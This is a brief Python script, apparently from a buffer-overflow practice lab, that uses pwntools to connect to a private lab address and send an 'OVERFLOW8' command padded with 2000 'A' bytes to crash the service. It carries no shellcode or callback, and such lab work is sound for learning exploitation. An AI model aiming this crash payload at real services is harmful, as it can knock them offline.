#!/usr/bin/env python3

from pwn import *

host = "10.10.4.173"
port = 1337

s = remote(host, port)

payload = [
    b"OVERFLOW8 ",
    b"A" * 2000,
]

payload = b"".join(payload)
s.send(payload)
s.close()